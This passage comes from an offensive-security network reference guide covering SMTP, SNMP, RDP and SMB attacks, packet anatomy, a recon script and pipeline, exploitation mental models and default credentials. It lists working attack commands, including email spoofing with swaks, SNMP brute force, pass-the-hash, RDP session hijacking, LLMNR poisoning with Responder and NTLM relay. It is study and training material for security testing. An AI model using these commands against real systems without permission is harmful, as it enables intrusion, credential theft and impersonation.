SMTP (Simple Mail Transfer Protocol) — TCP 25 (server-to-server), 587 (submission), 465 (SMTPS)

SMTP Session:
C: [TCP Connect to port 25]
S: 220 mail.example.com ESMTP Postfix
C: EHLO attacker.com
S: 250-mail.example.com
   250-SIZE 10240000
   250-AUTH LOGIN PLAIN
   250-STARTTLS
   250 8BITMIME
C: MAIL FROM:<sender@attacker.com>
S: 250 Ok
C: RCPT TO:<victim@example.com>
S: 250 Ok
C: DATA
S: 354 End data with <CR><LF>.<CR><LF>
C: Subject: Test
   From: Sender <sender@attacker.com>
   To: Victim <victim@example.com>
   
   Message body here
   .
S: 250 Ok: queued as 12345
C: QUIT
S: 221 Bye

SMTP Security Checks:
  SPF: Who can send mail for this domain?
    v=spf1 ip4:192.0.2.0/24 include:_spf.google.com -all
    -all = fail (reject), ~all = soft fail (mark), +all = accept any (BAD)
    
  DKIM: Is this email signed by domain's key?
    Signature in DKIM-Signature header
    Public key in DNS: selector._domainkey.example.com TXT
    
  DMARC: What to do with SPF/DKIM failures?
    _dmarc.example.com TXT: v=DMARC1; p=reject; rua=mailto:dmarc@example.com
    p=none: monitor only (weakest), p=quarantine: spam folder, p=reject: block
    
  Email spoofing test:
    # Check if domain rejects unauthenticated mail
    dig example.com TXT | grep spf
    dig _dmarc.example.com TXT
    
    # If SPF ~all or DMARC p=none: domain spoofing possible
    # Test with email-spoof tools or swaks
    swaks --to victim@target.com --from ceo@target.com --server mail.target.com
    
SMTP relay abuse:
  Open relay: accepts mail from anyone to anyone (spam relay)
  Test: MAIL FROM:<test@attacker.com> RCPT TO:<victim@gmail.com>
  If accepted: open relay → can send spam/phishing as target domain
  
  smtp-user-enum: enumerate users via VRFY/EXPN commands
    smtp-user-enum -M VRFY -U users.txt -t mail.target.com
```

### SNMP

```
SNMP (Simple Network Management Protocol) — UDP 161 (agent), 162 (trap receiver)

Versions:
  SNMPv1: Community string (cleartext), no encryption → "public" = goldmine
  SNMPv2c: Community string (cleartext), bulk operations
  SNMPv3: Authentication + Encryption (authPriv mode) — secure
  
MIB (Management Information Base):
  Tree structure of manageable objects
  OID (Object Identifier): 1.3.6.1.2.1.1.1.0 = sysDescr
  
  Key OIDs:
    1.3.6.1.2.1.1.1.0   sysDescr    (system description, OS version)
    1.3.6.1.2.1.1.5.0   sysName     (hostname)
    1.3.6.1.2.1.4.34    ipAddressTable (IP addresses)
    1.3.6.1.2.1.25.4.2.1 hrSWRunName (running processes)
    1.3.6.1.2.1.25.6.3.1.2 hrSWInstalledName (installed software)
    1.3.6.1.4.1.9 (Cisco): Cisco-specific MIBs
    
Community Strings:
  Default read: "public"
  Default write: "private"  ← can reconfigure device if writable!
  
SNMP Reconnaissance:
  # Check if SNMP open
  nmap -sU -p 161 target.com
  
  # Enumerate with community string
  snmpwalk -v2c -c public target.com
  snmpwalk -v2c -c public target.com 1.3.6.1.2.1.1  # System info
  snmpwalk -v2c -c public target.com 1.3.6.1.2.1.25.4.2.1.2  # Processes
  
  # Brute force community string
  onesixtyone -c community_strings.txt target.com
  
  # Massive SNMP scan
  braa public@192.168.1.0/24:.1.3.6.1.2.1.1.1.0
  
SNMP Write Attack:
  snmpset -v2c -c private target.com 1.3.6.1.2.1.1.5.0 s "pwned"
  # Changes hostname — if writable, can potentially change routes, configs
```

### RDP (Remote Desktop Protocol)

```
RDP — TCP 3389 (default, also UDP 3389 for UDP transport)

Protocol stack:
  RDP → RDP Security Layer or TLS → TCP 3389

Security levels:
  Classic RDP: Proprietary encryption (RC4) — weak, deprecated
  TLS: Certificates used for encryption
  NLA (Network Level Authentication): Credentials validated before RDP session
    → Protects against BlueKeep-style unauthenticated RCE (sort of)
    
Notable RDP CVEs:
  CVE-2019-0708 (BlueKeep): Pre-auth RCE on Windows XP/7/Server 2008
  CVE-2019-1181/1182 (DejaBlue): Similar to BlueKeep on newer Windows
  CVE-2012-0002 (MS12-020): Pre-auth DoS/potential RCE
  CVE-2021-34535: Remote Desktop Client RCE (victim connects to malicious server)
  
RDP Attacks:
  Pass-the-Hash: Use NT hash directly
    xfreerdp /u:Administrator /pth:[NTLM_HASH] /v:target.com
    
  Credential brute force (careful — lockouts):
    hydra -l administrator -P passwords.txt rdp://target.com
    
  RDP session hijacking (with SYSTEM privs on box):
    query user  # See other sessions
    tscon [SESSION_ID] /dest:[ATTACKER_SESSION]  # Hijack without password
    
  Man-in-the-middle (without NLA):
    Seth: MitM RDP with credential capture
    pyrdp: RDP proxy for MitM
```

---

## 23. Packet Anatomy — Every Header Explained

### Full Protocol Stack for HTTPS Request

```
A complete HTTPS POST request packet-by-packet:

Physical: Electrical signals on Cat6 cable (Manchester encoding)

Ethernet Frame:
+------------------+------------------+---------+----------+-------+------+
|  Dst MAC (6B)    |  Src MAC (6B)    | Type(2B)| IP Packet| Pad   | FCS  |
| Router_MAC       | Client_MAC       | 0x0800  | (payload)| (0-46B| CRC32|
+------------------+------------------+---------+----------+-------+------+

IPv4 Packet (inside Ethernet payload):
+-----+-----+-------+-------+-----------+-----+-------+---------+----------+
| Ver | IHL | DSCP  | TotLen| ID        | Flg |FragOff| TTL=64  |Proto=0x06|
|  4  |  5  | 0x00  | 0x0254| 0x1234    | 010 | 0     | (TCP)   |          |
+-----+-----+-------+-------+-----------+-----+-------+---------+----------+
| Header Checksum  | Src IP: 192.168.1.10  | Dst IP: 93.184.216.34        |
+------------------+-----------------------+------------------------------+

TCP Segment (inside IPv4 payload):
+----------+----------+------------------+------------------+
|SrcPort   |DstPort   |Sequence Number   |Acknowledge Num   |
|52341     |443       |0xABC12345        |0x11223344        |
+----------+----------+------------------+------------------+
|DataOffset|Reserved  |Flags             |Window Size       |
|    5     |  000     | 0x018 (ACK+PSH)  |  65535           |
+----------+----------+------------------+------------------+
|Checksum  |Urgent Ptr|                                     |
|0xF234    | 0x0000   |                                     |
+----------+----------+                                     |

TLS Record (inside TCP payload):
+----------+----------+----------+---------------------+
|ContentTyp|Version   |Length    |TLS Payload          |
|0x17      |0x0303    |0x0240    |(Application Data)   |
|(AppData) |(TLS 1.2) |          |                     |
+----------+----------+----------+---------------------+

HTTP Request (encrypted inside TLS, shown decrypted):
POST /api/login HTTP/1.1\r\n
Host: example.com\r\n
Content-Type: application/json\r\n
Content-Length: 42\r\n
Authorization: Bearer eyJhbGc...\r\n
\r\n
{"username":"admin","password":"hunter2"}
```

### Wireshark Display Filter Cheatsheet

```
# Protocol filters
http          # HTTP traffic
https         # HTTPS (shows as TLS)
tls           # All TLS
dns           # DNS
tcp           # TCP
udp           # UDP
icmp          # ICMP
arp           # ARP
smtp          # SMTP
ftp           # FTP

# IP filters
ip.src == 192.168.1.10
ip.dst == 8.8.8.8
ip.addr == 192.168.1.0/24         # Source or destination in subnet

# TCP filters
tcp.port == 443
tcp.flags.syn == 1                # SYN packets
tcp.flags.syn == 1 && tcp.flags.ack == 0  # Only SYN (not SYN-ACK)
tcp.flags.rst == 1                # RST packets (connection resets)
tcp.analysis.retransmission       # Retransmitted packets

# HTTP filters
http.request.method == "POST"
http.response.code == 200
http.request.uri contains "login"
http.host == "example.com"
http.cookie contains "session"

# DNS filters
dns.qry.name == "example.com"
dns.flags.rcode == 3              # NXDOMAIN responses

# TLS filters
tls.handshake.type == 1           # ClientHello
tls.handshake.type == 2           # ServerHello
tls.record.content_type == 21     # Alert (connection errors)

# Useful combinations
http.request && ip.src == 192.168.1.10        # HTTP requests from specific host
tcp.port == 80 || tcp.port == 443             # HTTP and HTTPS
!http && !dns && !arp                          # Exclude common noise
ip.ttl < 5                                     # Packets about to expire (traceroute)

# Follow stream: Right-click → Follow → TCP Stream
# Export objects: File → Export Objects → HTTP (save all transferred files)
```

---

## 24. Common Network Attack Surfaces

### Attack Surface Map

```
External Perimeter:
├── DNS
│   ├── Zone transfer (AXFR)
│   ├── Subdomain enumeration
│   ├── DNS cache poisoning
│   └── Subdomain takeover
├── Web (HTTP/HTTPS)
│   ├── XSS, SQLi, SSRF, IDOR
│   ├── Authentication flaws
│   ├── Business logic
│   └── API misconfigurations
├── Email (SMTP)
│   ├── Open relay
│   ├── User enumeration
│   └── SPF/DMARC bypass (spoofing)
├── Remote Access
│   ├── SSH (weak creds, key reuse)
│   ├── RDP (BlueKeep, brute force)
│   └── VPN (IKE, client vulns)
└── Public Services
    ├── Exposed databases (Mongo, Redis, Elastic)
    ├── Cloud storage (S3, GCS, Azure Blob)
    └── Exposed admin panels

Internal Network (post-initial access):
├── Protocol attacks
│   ├── ARP spoofing → MitM
│   ├── DNS spoofing
│   ├── LLMNR/NBT-NS poisoning
│   └── DHCP starvation/rogue DHCP
├── Lateral movement
│   ├── SMB (Pass-the-Hash, EternalBlue)
│   ├── RPC/WMI/DCOM
│   ├── SSH agent forwarding
│   └── Kerberos (Pass-the-Ticket, AS-REP roasting)
└── Data exfiltration
    ├── DNS tunneling
    ├── HTTP/HTTPS tunneling
    ├── ICMP tunneling
    └── Steganography
```

### LLMNR/NBT-NS Poisoning

```
LLMNR (Link-Local Multicast Name Resolution) and NBT-NS:
  Windows fallback name resolution (when DNS fails)
  Broadcasts "Who is [hostname]?" to local network
  
Attack:
  1. Victim: "Who is FileServer? (DNS fails)"
  2. Attacker: "I am FileServer! Send me your credentials"
  3. Victim: Sends NTLMv2 hash (authentication attempt)
  4. Attacker: Captures hash → crack offline or relay
  
Tool: Responder
  sudo responder -I eth0 -wrf
  # Captures: NTLMv2 hashes, NTLMv1 hashes, cleartext (via HTTP/FTP/SMTP)
  
NTLMv2 hash cracking:
  hashcat -m 5600 ntlmv2.hash rockyou.txt
  
NTLM Relay (when cracking fails):
  Relay captured hash to another service that accepts NTLM auth
  ntlmrelayx.py -t smb://192.168.1.20 -smb2support
  # Relay to SMB: may get remote command execution
  # Relay to LDAP: may add user to domain admins
  
Mitigations:
  Disable LLMNR: Group Policy → Network → DNS → Turn off multicast
  Disable NBT-NS: Network adapter → TCP/IP → Advanced → WINS → Disable
  Enable SMB signing: Prevents relaying (but not capture)
```

### SMB — A Rich Attack Surface

```
SMB (Server Message Block) — TCP 445 (direct), 139 (NetBIOS), UDP 137-138

SMB Versions:
  SMB1: Obsolete, insecure (EternalBlue, WannaCry, NotPetya)
  SMB2: Windows Vista+, improved performance
  SMB2.1: Windows 7/Server 2008 R2
  SMB3: Windows 8/Server 2012, encryption support
  SMB3.1.1: Windows 10, pre-auth integrity check

Critical CVEs:
  MS17-010 (EternalBlue):
    SMBv1 heap overflow, unauthenticated RCE
    Basis for WannaCry (ransomware), NotPetya
    
  CVE-2020-0796 (SMBGhost):
    SMBv3 compression header integer overflow
    RCE on Windows 10 1903/1909
    
  PrintNightmare (CVE-2021-1675):
    Windows Print Spooler RCE via SMB
    
SMB Recon:
  # Enumerate shares
  smbclient -L //target.com -N      # Null session
  smbclient -L //target.com -U user%pass
  
  crackmapexec smb 192.168.1.0/24
  crackmapexec smb target.com -u user -p pass --shares
  
  # Check for EternalBlue
  nmap -p 445 --script smb-vuln-ms17-010 target.com
  
  # Check SMB signing (required for relay attacks)
  crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
  # Outputs hosts where signing is not required → relay targets
  
Pass-the-Hash:
  # Authenticate with NTLM hash directly (no password needed)
  smbclient //target.com/C$ -U Administrator%[NTLM_hash] --pw-nt-hash
  crackmapexec smb target.com -u Administrator -H [NTLM_hash]
  impacket-psexec administrator@target.com -hashes :[NTLM_hash]
```

---

## 25. Network Recon Methodology

### Phase 1: Passive Recon (No direct target contact)

```bash
# 1. ASN and IP ranges
whois -h whois.radb.net '!gAS[number]'
curl "https://api.bgpview.io/asn/[ASN]/prefixes"

# 2. DNS enumeration (no target DNS server contact)
subfinder -d target.com -silent -o subdomains.txt
amass enum -passive -d target.com -o amass_passive.txt
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# 3. Historical data
# SecurityTrails, RiskIQ, Shodan, Censys, VirusTotal

# 4. Google dorks
site:target.com -www                        # Non-www subdomains
site:target.com filetype:pdf                # Documents
site:target.com inurl:admin                 # Admin panels
site:target.com "Index of /"               # Directory listings
"target.com" inurl:wp-admin                 # WordPress installs
site:target.com ext:env OR ext:config OR ext:bak  # Config files

# 5. Shodan search
shodan search "org:Target Company" --fields ip_str,port,hostnames
shodan search "ssl.cert.subject.cn:*.target.com" --fields ip_str,port
shodan search "http.html:target.com" --fields ip_str,port,http.title

# 6. Certificate transparency
# crt.sh, Facebook Cert Transparency, Google CT
```

### Phase 2: Active Recon (Direct target contact)

```bash
# 1. DNS active enumeration
dnsx -d target.com -w subdomains-wordlist.txt -t 200 -o dns_brute.txt
# Wordlists: SecLists/Discovery/DNS/

# Resolve all subdomains to IPs
cat subdomains.txt | dnsx -silent -a -resp -o resolved.txt

# 2. HTTP probing — find live web services
cat resolved.txt | httpx -silent -title -tech-detect -status-code -o live_hosts.txt

# 3. Port scanning
# Quick scan of critical ports
nmap -sV --open -p 21,22,23,25,53,80,110,111,135,137,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443 -iL live_hosts.txt -oA nmap_quick

# Full port scan (slower)
nmap -sV -sC -p- --open -iL live_hosts.txt -oA nmap_full --rate 1000

# UDP top ports (important — often missed)
nmap -sU --top-ports 100 -iL live_hosts.txt -oA nmap_udp

# 4. Service fingerprinting
nmap -sV --version-intensity 9 -p [open_ports] target.com

# 5. Web technology detection
whatweb -a 3 https://target.com
wappalyzer (browser extension or CLI)

# 6. Screenshot all web services
gowitness file -f live_hosts.txt --screenshot-path ./screenshots

# 7. Directory/endpoint discovery
ffuf -u https://target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -mc 200,201,301,302,401,403 -t 50 -o ffuf_dirs.json

# 8. Parameter discovery
arjun -u https://target.com/api/endpoint
```

### Phase 3: Vulnerability Discovery

```bash
# 1. Automated vulnerability scanning
nuclei -l live_hosts.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei_results.txt

# 2. Specific checks
# Check for subdomain takeover
subjack -w subdomains.txt -t 100 -ssl -o takeover.txt

# Check for exposed secrets
gitleaks detect --source=.  # If you have source code access
truffleHog filesystem --directory .

# Check for cloud misconfigs
# S3 buckets
python3 bucket_finder.py target.com
aws s3 ls s3://[bucket-name] --no-sign-request

# 3. Manual verification and escalation
# Every finding gets manual verification in Burp Suite
```

### Recon Pipeline

```bash
#!/bin/bash
# Quick recon pipeline

TARGET=$1
OUTPUT_DIR="recon_${TARGET}"
mkdir -p $OUTPUT_DIR/{dns,ports,web,screenshots}

echo "[*] Starting recon on $TARGET"

# Passive subdomain enum
echo "[*] Subdomain enumeration..."
subfinder -d $TARGET -silent | tee $OUTPUT_DIR/dns/subdomains_subfinder.txt
amass enum -passive -d $TARGET | tee $OUTPUT_DIR/dns/subdomains_amass.txt
cat $OUTPUT_DIR/dns/subdomains_*.txt | sort -u > $OUTPUT_DIR/dns/all_subdomains.txt

# DNS resolution
echo "[*] Resolving subdomains..."
dnsx -l $OUTPUT_DIR/dns/all_subdomains.txt -silent -a -resp-only | sort -u > $OUTPUT_DIR/dns/ips.txt

# HTTP probing
echo "[*] HTTP probing..."
httpx -l $OUTPUT_DIR/dns/all_subdomains.txt -silent -title -tech-detect \
  -status-code -follow-redirects -o $OUTPUT_DIR/web/live_hosts.txt

# Port scan on discovered IPs
echo "[*] Port scanning..."
nmap -sV --open -p- --rate 2000 -iL $OUTPUT_DIR/dns/ips.txt \
  -oA $OUTPUT_DIR/ports/nmap_full 2>/dev/null

# Screenshots
echo "[*] Taking screenshots..."
gowitness file -f $OUTPUT_DIR/web/live_hosts.txt \
  --screenshot-path $OUTPUT_DIR/screenshots/ 2>/dev/null

# Nuclei scan
echo "[*] Running nuclei..."
nuclei -l $OUTPUT_DIR/web/live_hosts.txt -severity critical,high \
  -o $OUTPUT_DIR/web/nuclei_results.txt -silent

echo "[+] Recon complete. Results in $OUTPUT_DIR/"
```

---

## 26. Mental Models for Exploitation

### The Trust Boundary Model

Every network has trust boundaries. The key question is always: **"What does this device/service trust that it shouldn't?"**

```
Internet (untrusted)
    |
    v
[WAF] ← trusts nothing from internet
    |
    v
[Load Balancer] ← trusts WAF output
    |
    v
[App Server] ← trusts LB headers (X-Forwarded-For!)
    |
    v
[Database] ← trusts app server completely
    |
    v
[Internal APIs] ← trusts app server completely

Attack: Find something in "untrusted" zone that gets treated as "trusted"
  X-Forwarded-For: 127.0.0.1 → app trusts it → IP-based bypass
  Host: internal.corp.com → app uses it for redirects → SSRF
  SQL via HTTP param → DB executes without validation → SQLi
```

### The Protocol Layer Attack Model

```
For any vulnerability, ask: "Which layer is exploitable?"

Layer 7 exploit examples (same vulnerability at different layers):
  - HTTP smuggling: Layer 7 protocol parsing discrepancy
  - SSRF: Layer 7 app makes layer 3 connection on behalf of attacker
  - XSS: Layer 7 HTML/JS context injection

Ask yourself for each component:
  1. What layer does this device operate at?
  2. What can it NOT see?
  3. What does it blindly forward?
  4. What does the next component trust from this one?
```

### The State Machine Model

```
Every protocol is a state machine. Attacks exploit invalid state transitions:

TCP:
  CLOSED → SYN_SENT → ESTABLISHED → CLOSE_WAIT → ...
  
  Attack: Send RST in wrong state → firewall confused
  Attack: Send ACK without SYN → some stacks crash (older)
  
HTTP:
  Request → Response (simple)
  But with pipelining: Req1, Req2, Req3 → Resp1, Resp2, Resp3
  
  Attack: Smuggle Req2 that the server thinks is start of next cycle
    → Resp2 goes to innocent user's next request
    
TLS:
  ClientHello → ServerHello → Certificate → HandshakeFinished → AppData
  
  Attack: Version downgrade → weaker algorithms (POODLE, FREAK)
  Attack: Renegotiation MitM (old TLS renegotiation flaw)
```

### The Parsing Differential Model

```
Discrepancy between how two systems parse the same input = attack opportunity.

Examples:

1. HTTP Request Smuggling:
   Front-end (sees): Content-Length = 100 (uses CL)
   Back-end (sees):  Transfer-Encoding: chunked (uses TE)
   → Same bytes parsed differently → desync

2. WAF vs Application:
   WAF (sees): <script> → blocked
   App (sees after normalization): &#60;script&#62; → XSS
   
3. SQL Parser:
   WAF (sees): ' OR '1'='1' → blocked
   DB (sees after case folding): ' oR '1'='1' → injection
   
4. Path normalization:
   WAF (sees): /api/admin/../secret → normalized to /api/secret → allowed
   App server (sees): /api/admin/../secret → traversal → admin endpoint
   
Rule: Whenever two systems process the same input, look for normalization
and parsing differences. The gap between their interpretations is your attack surface.
```

### The Trust Inheritance Model (for Cloud/Microservices)

```
In microservice architectures:
  API Gateway authenticates user
  Passes claims to internal services via headers
  Internal services TRUST these headers completely
  
Attack: If attacker can send directly to internal service (misconfigured SG):
  Add header: X-User-ID: 1 (admin)
  X-User-Role: admin
  X-Authenticated: true
  
  Internal service trusts these → full bypass
  
Or via SSRF: If SSRF gives internal network access:
  Request to internal-api.corp.com:8080/admin
  Internal service assumes request came from trusted gateway
  
Mental model: 
  External services: authenticate everything
  Internal services: often authenticate nothing (trust boundary assumption)
  SSRF/XXE/SSTI that reaches internal network = bypass all auth
```

### Network Pivoting Decision Tree

```
You have a shell/access on Host A.
Goal: Reach Host B in different network segment.

Is there a direct route (routing table)?
  Yes → Connect directly (might need tool: netcat, curl, etc.)
  No → Need to pivot

Can Host A reach Host B via TCP?
  Yes → Set up port forward or SOCKS proxy
    - SSH: ssh -L local:hostB:port user@A
    - Chisel: reverse SOCKS tunnel
    - Metasploit: route add + socks proxy
  No → Look for other pivot hosts Host A CAN reach

Can you use UDP?
  If TCP blocked but UDP allowed → DNS tunnel, ICMP tunnel, QUIC

Is there a VPN or trust relationship?
  VPN endpoint → find creds/key → connect → new network access
  Cloud VPC peering → pivot through peering

Always check:
  route / ip route       # Current routing table
  arp -a / ip neigh      # Hosts seen recently (layer 2 neighbors)
  netstat -rn            # Active connections (pivot candidates)
  ss -tlnp / netstat -tlnp  # Listening services (can you reach internal from here?)
  /etc/hosts             # Custom DNS entries (reveals internal hostnames)
  env | grep -i proxy    # Proxy settings (reveals architecture)
  cat /etc/resolv.conf   # Internal DNS servers
  ifconfig / ip addr     # All interfaces (dual-homed hosts!)
```

---

## Quick Reference Tables

### Common Default Credentials

```
Device/Service    Default Username    Default Password
Router (Cisco)    cisco               cisco / enable secret
Router (ASUS)     admin               admin
Router (Netgear)  admin               password
Router (D-Link)   admin               (blank)
Tomcat Manager    tomcat              tomcat / s3cret
Jenkins           admin               admin / (blank)
Grafana           admin               admin
Elasticsearch     (none)              (none — no auth)
MongoDB           (none)              (none — no auth pre-4.0)
Redis             (none)              (none)
Jupyter Notebook  (none)              (token-based, often no auth)
MySQL/MariaDB     root                (blank) or root
PostgreSQL        postgres            postgres
MSSQL             sa                  (blank) / sa
VMware ESXi       root                vmware / (blank)
IPMI/iDRAC        root/ADMIN          calvin/ADMIN
Printer HP        admin               admin / (blank)
Printer Canon     admin               canon / (blank)
```

### Firewall Evasion Quick Reference

```
Technique             Description                         Risk Level
---------             -----------                         ----------
Fragment packets      nmap -f / --mtu                     Low
Decoy IPs             nmap -D RND:10                      Low
Slow scan             nmap --scan-delay 5s                Low
Source port spoofing  nmap --source-port 53/80/443        Medium
Protocol substitution Use UDP instead of TCP              Low
IPv6 bypass           nmap -6 / use IPv6 address          Medium
Timing options        nmap -T0 (paranoid) to -T5           Low-Medium
SSL tunnel            Wrap in HTTPS port 443              Low
DNS tunnel            Encode in DNS queries               Medium
ICMP tunnel           Encode in ICMP Echo payload         Medium
```

### Useful Nmap Script Categories

```
auth:       Check for authentication vulnerabilities
broadcast:  Network discovery via broadcast
brute:      Brute force credentials
default:    Safe, useful scripts (nmap -sC or --script=default)
discovery:  Enumeration and network mapping
dos:        Denial of service (use with caution/permission)
exploit:    Active exploitation
external:   Queries external databases (WHOIS, shodan, etc.)
fuzzer:     Fuzz protocol fields
intrusive:  May crash target or generate logs
malware:    Detect malware
safe:       Low risk, won't crash targets
version:    Version detection support
vuln:       Check for known vulnerabilities

# Usage examples:
nmap --script=vuln target.com
nmap --script=http-* target.com        # All HTTP scripts
nmap --script=smb-vuln-* target.com   # All SMB vuln checks
nmap --script=ssl-* -p 443 target.com # SSL/TLS checks
```

---

*This guide represents a complete network architecture reference for security researchers. Every concept here connects to real attack paths. Master these mental models — they let you look at any network and immediately see the trust boundaries, parsing differentials, and layer separations that create exploitable vulnerabilities.*

*Build your methodology: Enumerate → Map → Trust model → Enumerate attack surface → Exploit differentials → Escalate via trust inheritance → Exfiltrate/pivot.*